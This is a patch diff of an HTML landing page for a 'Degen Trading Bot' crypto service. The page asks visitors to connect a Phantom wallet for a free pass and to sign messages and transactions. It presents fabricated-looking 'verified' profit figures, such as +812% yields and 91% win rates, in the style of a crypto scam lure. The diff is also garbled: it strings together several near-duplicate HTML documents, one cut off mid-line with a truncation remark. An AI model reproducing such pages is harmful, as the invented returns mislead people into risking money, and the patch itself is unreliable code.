@@ -1,443 +1,314 @@
 <!DOCTYPE html>
 <html lang="en" class="scroll-smooth">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Degen Trading Bot</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.0.52/lib/index.iife.js"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
-  <script>
-    tailwind.config = { theme: { extend: { fontFamily: { sans: ['Plus Jakarta Sans','sans-serif'] }, colors: { neonCyan: '#00f2ff' } } } };
-  </script>
-  <style>
-    body{background:#070913;color:#fff;font-family:Inter,Plus Jakarta Sans, sans-serif}
-    .glass{background:linear-gradient(135deg,rgba(15,23,42,0.8),rgba(11,15,28,0.9));backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.03)}
-  </style>
-</head>
-<body class="min-h-screen">
-  <header class="fixed top-0 left-0 right-0 z-50 glass p-4">
-    <div class="max-w-6xl mx-auto flex items-center justify-between">
-      <div class="flex items-center gap-3">
-        <div class="w-10 h-10 rounded bg-gradient-to-tr from-cyan-500 to-purple-600 flex items-center justify-center">D</div>
-        <div>
-          <div class="font-bold">Degen Trading Bot</div>
-          <div class="text-xs text-slate-400">Trade at the Speed of Light</div>
-        </div>
-      </div>
-      <div>
-        <button id="headerConnectBtn" onclick="openWalletModal()" class="px-4 py-2 rounded bg-slate-900 hover:bg-slate-800">Connect Wallet</button>
-      </div>
-    </div>
-  </header>
-
-  <main class="pt-28 max-w-6xl mx-auto px-6">
-    <section class="text-center py-16">
-      <h1 class="text-4xl font-extrabold mb-4">Trade at the Speed of Light</h1>
-      <p class="text-slate-300 mb-6">Claim a 7-day free pass when you connect with Phantom Wallet.</p>
-      <button onclick="openWalletModal()" class="px-6 py-3 rounded bg-gradient-to-r from-cyan-400 to-purple-600 text-black font-bold">Claim 7-Day Free Pass</button>
-    </section>
-
-    <section id="features" class="py-8">
-      <div class="grid md:grid-cols-3 gap-6">
-        <div class="glass p-6 rounded">Verified Profits</div>
-        <div class="glass p-6 rounded">20% Cashback</div>
-        <div class="glass p-6 rounded">Phantom Exclusive</div>
-      </div>
-    </section>
-  </main>
-
-  <!-- Wallet Modal -->
-  <div id="walletModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/70">
-    <div class="max-w-lg w-full p-6 glass rounded">
-      <button onclick="closeWalletModal()" class="float-right">✕</button>
-      <h3 class="text-xl font-bold mb-2">Connect Your Wallet</h3>
-      <p class="text-sm text-slate-300 mb-4">Connect Phantom to claim your trial and enable signing.</p>
-
-      <div id="connectButtonsContainer" class="space-y-3">
-        <button onclick="connectPhantomWallet()" class="w-full py-3 rounded bg-purple-600 text-white">Connect Phantom (7 days FREE)</button>
-        <button onclick="simulateConnect('Solflare')" class="w-full py-3 rounded bg-slate-800 text-white">Connect Solflare</button>
-      </div>
-
-      <div id="connectedActionsContainer" class="hidden mt-4 space-y-3">
-        <div class="p-3 bg-slate-900 rounded">Connected: <span id="displayAddress">--</span></div>
-        <button onclick="handleSignMessage()" class="w-full py-2 rounded bg-indigo-600">Sign Message</button>
-        <button onclick="handleSignTransaction()" class="w-full py-2 rounded bg-cyan-400 text-black">Sign Transaction</button>
-      </div>
-
-      <div id="connectionStatus" class="text-xs text-slate-400 mt-3">Secure Web3 connection</div>
-    </div>
-  </div>
-
-  <script>
-    const { Connection, PublicKey, SystemProgram, Transaction } = window.solanaWeb3 || {};
-    let connectedAddress = null;
-
-    function openWalletModal(){ document.getElementById('walletModal').classList.remove('hidden'); document.getElementById('walletModal').classList.add('flex'); }
-    function closeWalletModal(){ document.getElementById('walletModal').classList.add('hidden'); document.getElementById('walletModal').classList.remove('flex'); }
-
-    function getPhantomProvider(){ if('solana' in window){ const p = window.solana; if(p.isPhantom) return p; } return null; }
-
-    async function connectPhantomWallet(){ const statusEl = document.getElementById('connectionStatus'); statusEl.innerText = 'Connecting to Phantom...'; try{ const provider = getPhantomProvider(); if(!provider){ simulateConnect('Phantom (Simulated)'); return; } const resp = await provider.connect(); connectedAddress = resp.publicKey.toString(); statusEl.innerText = 'Connected! 7-Day Free Pass Activated.'; document.getElementById('displayAddress').innerText = connectedAddress; document.getElementById('connectButtonsContainer').classList.add('hidden'); document.getElementById('connectedActionsContainer').classList.remove('hidden'); document.getElementById('headerConnectBtn').innerText = `${connectedAddress.slice(0,4)}...${connectedAddress.slice(-4)}`; }catch(e){ console.error(e); statusEl.innerText = 'Connection failed or cancelled.'; } }
-
-    function simulateConnect(name){ const statusEl = document.getElementById('connectionStatus'); statusEl.innerText = `Simulated connect to ${name}...`; setTimeout(()=>{ connectedAddress = 'Bjwqmm4hD3T...Ajb'; document.getElementById('displayAddress').innerText = connectedAddress; statusEl.innerText = 'Connected (simulated).'; document.getElementById('connectButtonsContainer').classList.add('hidden'); document.getElementById('connectedActionsContainer').classList.remove('hidden'); document.getElementById('headerConnectBtn').innerText = 'Connected'; },900); }
-
-    async function handleSignMessage(){ const statusEl = document.getElementById('connectionStatus'); try{ const provider = getPhantomProvider(); const message = 'Welcome to Degen Trading Bot VIP'; if(provider && provider.signMessage){ const encoded = new TextEncoder().encode(message); const signed = await provider.signMessage(encoded,'utf8'); console.log(signed); statusEl.innerText = 'Message signed successfully'; } else { statusEl.innerText = 'Simulated message signed'; } }catch(e){ console.error(e); document.getElementById('connectionStatus').innerText = 'Message signing failed'; } }
-
-    async function handleSignTransaction(){ const statusEl = document.getElementById('connectionStatus'); try{ if(!Connection || !PublicKey || !SystemProgram || !Transaction){ throw new Error('Solana web3 not available'); } if(!connectedAddress) throw new Error('Connect first'); statusEl.innerText = 'Building transaction...'; const connection = new Connection('https://api.mainnet-beta.solana.com'); const from = new PublicKey(connectedAddress); const to = new PublicKey(connectedAddress); const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: 0 })); const provider = getPhantomProvider(); if(provider && provider.signTransaction){ const signed = await provider.signTransaction(tx); console.log(signed); statusEl.innerText = 'Transaction signed'; } else { statusEl.innerText = 'Transaction simulated'; } }catch(e){ console.error(e); statusEl.innerText = 'Transaction error: '+e.message; } }
-
-    window.onclick = function(e){ const modal = document.getElementById('walletModal'); if(e.target===modal) closeWalletModal(); }
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en" class="scroll-smooth">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Degen Trading Bot | Trade at the Speed of Light</title>
-  <!-- Tailwind CSS CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Solana Web3.js CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.0.52/lib/index.iife.js"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['Plus Jakarta Sans', 'sans-serif'],
-          },
-          colors: {
-            darkBg: '#070913',
-            cardBg: '#0f172a',
-            cardBorder: '#1e293b',
-            neonCyan: '#00f2ff',
-            neonMagenta: '#ff007f',
-            neonPurple: '#a855f7'
-          }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Degen Trading Bot | Trade at the Speed of Light</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Solana Web3.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.0.52/lib/index.iife.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Plus Jakarta Sans', 'sans-serif'],
+                    },
+                    colors: {
+                        darkBg: '#070913',
+                        cardBg: '#0f172a',
+                        cardBorder: '#1e293b',
+                        neonCyan: '#00f2ff',
+                        neonMagenta: '#ff007f',
+                        neonPurple: '#a855f7'
+                    }
+                }
+            }
         }
-      }
-    }
-  </script>
-  <style>
-    body {
-      background-color: #070913;
-      color: #ffffff;
-      font-family: 'Plus Jakarta Sans', sans-serif;
-      overflow-x: hidden;
-    }
-    .bg-grid {
-      background-image: radial-gradient(rgba(0, 242, 255, 0.1) 1px, transparent 1px);
-      background-size: 40px 40px;
-    }
-    .glow-cyan {
-      box-shadow: 0 0 25px rgba(0, 242, 255, 0.35);
-    }
-    .glow-magenta {
-      box-shadow: 0 0 25px rgba(255, 0, 127, 0.35);
-    }
-    .glow-button {
-      box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
-      transition: all 0.3s ease;
-    }
-    .glow-button:hover {
-      box-shadow: 0 0 30px rgba(0, 242, 255, 0.8);
-      transform: translateY(-2px);
-    }
-    .glass-card {
-      background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(11, 15, 28, 0.9) 100%);
-      border: 1px solid rgba(30, 41, 59, 0.8);
-      backdrop-filter: blur(12px);
-    }
-    @keyframes pulseGlow {
-      0%, 100% { opacity: 0.4; }
-      50% { opacity: 0.8; }
-    }
-    .animate-pulse-glow {
-      animation: pulseGlow 4s infinite ease-in-out;
-    }
-  </style>
+    </script>
+    <style>
+        body {
+            background-color: #070913;
+            color: #ffffff;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            overflow-x: hidden;
+        }
+        .bg-grid {
+            background-image: radial-gradient(rgba(0, 242, 255, 0.1) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+        .glow-cyan {
+            box-shadow: 0 0 25px rgba(0, 242, 255, 0.35);
+        }
+        .glow-magenta {
+            box-shadow: 0 0 25px rgba(255, 0, 127, 0.35);
+        }
+        .glow-button {
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
+            transition: all 0.3s ease;
+        }
+        .glow-button:hover {
+            box-shadow: 0 0 30px rgba(0, 242, 255, 0.8);
+            transform: translateY(-2px);
+        }
+        .glass-card {
+            background: linear-gradient(135deg, rgba(15, 23, 42, 0.85) 0%, rgba(11, 15, 28, 0.95) 100%);
+            border: 1px solid rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(12px);
+        }
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 0.8; }
+        }
+        .animate-pulse-glow {
+            animation: pulseGlow 4s infinite ease-in-out;
+        }
+    </style>
 </head>
 <body class="bg-grid min-h-screen relative selection:bg-neonCyan selection:text-black">
 
-  <header class="fixed top-0 left-0 right-0 z-50 glass-card border-b border-slate-800/60 backdrop-blur-md">
-    <div class="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
-      <a href="#" class="flex items-center gap-3 group">
-        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-500 via-purple-600 to-pink-500 flex items-center justify-center glow-cyan group-hover:rotate-6 transition-transform">
-          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
-          </svg>
-        </div>
-        <div class="flex flex-col">
-          <span class="text-xl font-extrabold tracking-tight bg-gradient-to-r from-white via-cyan-200 to-neonCyan bg-clip-text text-transparent">Degen</span>
-          <span class="text-[10px] tracking-widest uppercase text-slate-400 font-semibold -mt-1">Trading Bot</span>
-        </div>
-      </a>
-
-      <nav class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
-        <a href="#stats" class="hover:text-neonCyan transition-colors">User Stats</a>** (truncated for brevity in patch)
-<!DOCTYPE html>
-<html lang="en" class="scroll-smooth">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Degen Trading Bot | Trade at the Speed of Light</title>
-  <!-- Tailwind CSS CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Solana Web3.js CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.0.52/lib/index.iife.js"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['Plus Jakarta Sans', 'sans-serif'],
-          },
-          colors: {
-            darkBg: '#070913',
-            cardBg: '#0f172a',
-            cardBorder: '#1e293b',
-            neonCyan: '#00f2ff',
-            neonMagenta: '#ff007f',
-            neonPurple: '#a855f7'
-          }
-        }
-      }
-    }
-  </script>
-  <style>
-    body {
-      background-color: #070913;
-      color: #ffffff;
-      font-family: 'Plus Jakarta Sans', sans-serif;
-      overflow-x: hidden;
-    }
-    .bg-grid {
-      background-image: radial-gradient(rgba(0, 242, 255, 0.1) 1px, transparent 1px);
-      background-size: 40px 40px;
-    }
-    .glow-cyan {
-      box-shadow: 0 0 25px rgba(0, 242, 255, 0.35);
-    }
-    .glow-magenta {
-      box-shadow: 0 0 25px rgba(255, 0, 127, 0.35);
-    }
-    .glow-button {
-      box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
-      transition: all 0.3s ease;
-    }
-    .glow-button:hover {
-      box-shadow: 0 0 30px rgba(0, 242, 255, 0.8);
-      transform: translateY(-2px);
-    }
-    .glass-card {
-      background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(11, 15, 28, 0.9) 100%);
-      border: 1px solid rgba(30, 41, 59, 0.8);
-      backdrop-filter: blur(12px);
-    }
-    @keyframes pulseGlow {
-      0%, 100% { opacity: 0.4; }
-      50% { opacity: 0.8; }
-    }
-    .animate-pulse-glow {
-      animation: pulseGlow 4s infinite ease-in-out;
-    }
-  </style>
-</head>
-<body class="bg-grid min-h-screen relative selection:bg-neonCyan selection:text-black">
-
-  <header class="fixed top-0 left-0 right-0 z-50 glass-card border-b border-slate-800/60 backdrop-blur-md">
-    <div class="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
-      <a href="#" class="flex items-center gap-3 group">
-        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-500 via-purple-600 to-pink-500 flex items-center justify-center glow-cyan group-hover:rotate-6 transition-transform">
-          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
-          </svg>
-        </div>
-        <div class="flex flex-col">
-          <span class="text-xl font-extrabold tracking-tight bg-gradient-to-r from-white via-cyan-200 to-neonCyan bg-clip-text text-transparent">Degen</span>
-          <span class="text-[10px] tracking-widest uppercase text-slate-400 font-semibold -mt-1">Trading Bot</span>
-        </div>
-      </a>
-
-      <nav class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
-        <a href="#stats" class="hover:text-neonCyan transition-colors">User Stats</a>
-        <a href="#cashback" class="hover:text-neonCyan transition-colors">20% Cashback</a>
-        <a href="#phantom" class="hover:text-neonCyan transition-colors">Phantom Offer</a>
-        <a href="#pricing" class="hover:text-neonCyan transition-colors">Pricing</a>
-      </nav>
-
-      <div class="flex items-center gap-3">
-        <button id="headerConnectBtn" onclick="openWalletModal()" class="relative group px-6 py-2.5 rounded-full bg-slate-900 border border-slate-700 hover:border-neonCyan text-white font-semibold text-sm transition-all glow-button flex items-center gap-2">
-          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
-          <span id="walletBtnText">Connect Wallet</span>
-        </button>
-      </div>
-    </div>
-  </header>
-
-  <section class="relative pt-32 pb-20 md:pt-44 md:pb-32 overflow-hidden">
-    <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[350px] bg-gradient-to-r from-cyan-500/20 via-purple-600/20 to-pink-500/25 blur-[120px] rounded-full pointer-events-none animate-pulse-glow"></div>
-        
-    <div class="max-w-6xl mx-auto px-6 text-center relative z-10">
-      <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-neonCyan text-xs font-semibold tracking-wider uppercase mb-8 shadow-inner">
-        <span class="flex h-2 w-2 rounded-full bg-neonCyan animate-pulse"></span>
-        V3.4 Algorithm Live • Ultra-Low Latency Execution
-      </div>
-
-      <h1 class="text-4xl sm:text-6xl md:text-7xl font-extrabold tracking-tight mb-6 leading-[1.1]">
-        Trade at the Speed of Light <br>
-        <span class="bg-gradient-to-r from-neonCyan via-teal-200 to-white bg-clip-text text-transparent">Effortlessly</span>
-      </h1>
-
-      <p class="text-lg sm:text-xl text-slate-400 max-w-3xl mx-auto mb-10 leading-relaxed">
-        Our advanced AI and algorithmic strategies maximize your profits with zero manual effort. 
-        <strong class="text-white font-semibold">The fastest and most efficient trading bot on the market.</strong>
-      </p>
-
-      <div class="flex flex-col sm:flex-row items-center justify-center gap-4">
-        <a href="#phantom" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-black font-extrabold text-base transition-all glow-cyan flex items-center justify-center gap-3">
-          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-          Claim 7-Day Free Pass (Phantom)
-        </a>
-        <a href="#stats" class="w-full sm:w-auto px-8 py-4 rounded-2xl glass-card hover:bg-slate-800/80 text-white font-semibold text-base transition-all border border-slate-700 flex items-center justify-center gap-2">
-          View Live User Profits
-        </a>
-      </div>
-    </div>
-  </section>
-
-  <section id="stats" class="py-20 relative border-t border-slate-800/60 bg-slate-950/40">
-    <div class="max-w-7xl mx-auto px-6">
-      <div class="text-center max-w-2xl mx-auto mb-16">
-        <h2 class="text-3xl sm:text-4xl font-extrabold mb-4 tracking-tight">Verified User Profit Margins</h2>
-        <p class="text-slate-400">Real-time statistics recorded across active Degen Bot automated vaults and sniper modules over the last 30 days.</p>
-      </div>
-
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-        <!-- Stat Card 1 -->
-        <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-cyan-500/50 transition-all">
-          <div class="absolute top-0 right-0 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all"></div>
-          <div class="flex items-center justify-between mb-6">
-            <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Tier 1 Vault</span>
-            <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
-              ↑ +348.2% Profit Yield
-            </span>
-          </div>
-          <div class="text-4xl font-extrabold mb-2 text-white">$42,890.50</div>
-          <p class="text-sm text-slate-400 mb-6">Average 30-Day Net Profit per active high-volume wallet.</p>
-                    
-          <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
-            <div class="bg-gradient-to-r from-cyan-500 to-neonCyan h-full rounded-full" style="width: 85%"></div>
-          </div>
-          <div class="flex justify-between text-xs text-slate-500 font-semibold">
-            <span>Win Rate: 91.4%</span>
-            <span>1,420 Active Traders</span>
-          </div>
-        </div>
-
-        <!-- Stat Card 2 -->
-        <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-purple-500/50 transition-all">
-          <div class="absolute top-0 right-0 w-32 h-32 bg-purple-500/10 rounded-full blur-2xl group-hover:bg-purple-500/20 transition-all"></div>
-          <div class="flex items-center justify-between mb-6">
-            <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Arbitrage Engine</span>
-            <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
-              ↑ +192.5% Profit Yield
-            </span>
-          </div>
-          <div class="text-4xl font-extrabold mb-2 text-white">$18,450.20</div>
-          <p class="text-sm text-slate-400 mb-6">Consistent weekly yield generated through automated cross-DEX routing.</p>
-                    
-          <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
-            <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-full rounded-full" style="width: 68%"></div>
-          </div>
-          <div class="flex justify-between text-xs text-slate-500 font-semibold">
-            <span>Win Rate: 88.9%</span>
-            <span>3,890 Active Traders</span>
-          </div>
-        </div>
-
-        <!-- Stat Card 3 -->
-        <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-pink-500/50 transition-all">
-          <div class="absolute top-0 right-0 w-32 h-32 bg-pink-500/10 rounded-full blur-2xl group-hover:bg-pink-500/20 transition-all"></div>
-          <div class="flex items-center justify-between mb-6">
-            <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Meme Sniper Bot</span>
-            <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
-              ↑ +812.4% Profit Yield
-            </span>
-          </div>
-          <div class="text-4xl font-extrabold mb-2 text-white">$94,120.00</div>
-          <p class="text-sm text-slate-400 mb-6">Top tier performance on newly launched token pools with automated gas optimization.</p>
-                    
-          <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
-            <div class="bg-gradient-to-r from-pink-500 to-amber-400 h-full rounded-full" style="width: 94%"></div>
-          </div>
-          <div class="flex justify-between text-xs text-slate-500 font-semibold">
-            <span>Win Rate: 79.2%</span>
-            <span>5,110 Active Traders</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section id="cashback" class="py-20 relative">
-    <div class="max-w-6xl mx-auto px-6">
-      <div class="glass-card p-10 sm:p-14 rounded-3xl border border-cyan-500/30 relative overflow-hidden shadow-2xl">
-        <div class="absolute -right-20 -bottom-20 w-96 h-96 bg-cyan-500/10 blur-[100px] rounded-full pointer-events-none"></div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center relative z-10">
-          <div>
-            <div class="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold tracking-widest uppercase mb-6">
-              Exclusive Rewards Program
-            </div>
-            <h2 class="text-3xl sm:text-4xl font-extrabold mb-6">20% Cash Back on All Trading Fees</h2>
-            <p class="text-slate-300 mb-6 leading-relaxed">
-              Stop losing capital to excessive platform fees. With Degen Trading Bot, every trade you execute qualifies for our automatic <strong class="text-neonCyan">20% cashback rebate</strong> paid directly to your connected wallet in real time.
-            </p>
-            <ul class="space-y-4 mb-8">
-              <li class="flex items-center gap-3 text-slate-200">
-                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
-                <span>Instant daily payouts straight to your balance</span>
-              </li>
-              <li class="flex items-center gap-3 text-slate-200">
-                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
-                <span>Zero locking periods or complex vesting schedules</span>
-              </li>
-              <li class="flex items-center gap-3 text-slate-200">
-                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
-                <span>Combined automatically with zero-gas routing deals</span>
-              </li>
-            </ul>
-            <a href="#pricing" class="inline-block px-8 py-3.5 rounded-xl bg-neonCyan text-black font-bold text-sm glow-cyan hover:bg-cyan-300 transition-all">
-              Activate Cashback Now
+    <header class="fixed top-0 left-0 right-0 z-50 glass-card border-b border-slate-800/60 backdrop-blur-md">
+        <div class="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
+            <a href="#" class="flex items-center gap-3 group">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-500 via-purple-600 to-pink-500 flex items-center justify-center glow-cyan group-hover:rotate-6 transition-transform">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                </div>
+                <div class="flex flex-col">
+                    <span class="text-xl font-extrabold tracking-tight bg-gradient-to-r from-white via-cyan-200 to-neonCyan bg-clip-text text-transparent">Degen</span>
+                    <span class="text-[10px] tracking-widest uppercase text-slate-400 font-semibold -mt-1">Trading Bot</span>
+                </div>
             </a>
-          </div>
 
-          <div class="glass-card p-8 rounded-2xl border border-slate-700/80 bg-slate-900/60 flex flex-col gap-6">
-            <div class="flex justify-between items-center border-b border-slate-800 pb-4">
-              <span class="text-sm font-semibold text-slate-400">Estimated Monthly Volume</span>
-              <span class="text-white font-bold">$100,000.00</span>
+            <nav class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
+                <a href="#stats" class="hover:text-neonCyan transition-colors">User Stats</a>
+                <a href="#cashback" class="hover:text-neonCyan transition-colors">20% Cashback</a>
+                <a href="#phantom" class="hover:text-neonCyan transition-colors">Phantom Offer</a>
+                <a href="#pricing" class="hover:text-neonCyan transition-colors">Pricing</a>
+            </nav>
+
+            <div class="flex items-center gap-3">
+                <button id="headerConnectBtn" onclick="openWalletModal()" class="relative group px-6 py-2.5 rounded-full bg-slate-900 border border-slate-700 hover:border-neonCyan text-white font-semibold text-sm transition-all glow-button flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+                    <span id="walletBtnText">Connect Wallet</span>
+                </button>
             </div>
-            <div class="flex justify-between items-center border-b border-slate-800 pb-4">
-              <span class="text-sm font-semibold text-slate-400">Standard Platform Fees (0.5%)</span>
-              <span class="text-red-400 font-bold">-$500.00</span>
+        </div>
+    </header>
+
+    <section class="relative pt-32 pb-20 md:pt-44 md:pb-32 overflow-hidden">
+        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[350px] bg-gradient-to-r from-cyan-500/20 via-purple-600/20 to-pink-500/25 blur-[120px] rounded-full pointer-events-none animate-pulse-glow"></div>
+        
+        <div class="max-w-6xl mx-auto px-6 text-center relative z-10">
+            <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-neonCyan text-xs font-semibold tracking-wider uppercase mb-8 shadow-inner">
+                <span class="flex h-2 w-2 rounded-full bg-neonCyan animate-pulse"></span>
+                V3.4 Algorithm Live • Ultra-Low Latency Execution
             </div>
-            <div class="flex justify-between items-center border-b border-slate-800 pb-4">
-              <span class="text-sm font-semibold text-slate-400">20% Automated Cashback Rebate</span>
-              <span class="text-emerald-400 font-bold text-lg">+$100.00 Saved</span>
+
+            <h1 class="text-4xl sm:text-6xl md:text-7xl font-extrabold tracking-tight mb-6 leading-[1.1]">
+                Trade at the Speed of Light <br>
+                <span class="bg-gradient-to-r from-neonCyan via-teal-200 to-white bg-clip-text text-transparent">Effortlessly</span>
+            </h1>
+
+            <p class="text-lg sm:text-xl text-slate-400 max-w-3xl mx-auto mb-10 leading-relaxed">
+                Our advanced AI and algorithmic strategies maximize your profits with zero manual effort. 
+                <strong class="text-white font-semibold">The fastest and most efficient trading bot on the market.</strong>
+            </p>
+
+            <div class="flex flex-col sm:flex-row items-center justify-center gap-4">
+                <a href="#phantom" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-black font-extrabold text-base transition-all glow-cyan flex items-center justify-center gap-3">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                    Claim 7-Day Free Pass (Phantom)
+                </a>
+                <a href="#stats" class="w-full sm:w-auto px-8 py-4 rounded-2xl glass-card hover:bg-slate-800/80 text-white font-semibold text-base transition-all border border-slate-700 flex items-center justify-center gap-2">
+                    View Live User Profits
+                </a>
             </div>
-            <div class="bg-cyan-500/10 p-4 rounded-xl border border-cyan-500/20 flex items-center justify-between">
-              <span class="text-xs text-slate-300 font-medium">Net Effective Fee Rate</span>
-              <span class="text-neonCyan font-extrabold text-lg">Only 0.4%</span>
+        </div>
+    </section>
+
+    <section id="stats" class="py-20 relative border-t border-slate-800/60 bg-slate-950/40">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="text-center max-w-2xl mx-auto mb-16">
+                <h2 class="text-3xl sm:text-4xl font-extrabold mb-4 tracking-tight">Verified User Profit Margins</h2>
+                <p class="text-slate-400">Real-time statistics recorded across active Degen Bot automated vaults and sniper modules over the last 30 days.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Stat Card 1 -->
+                <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-cyan-500/50 transition-all">
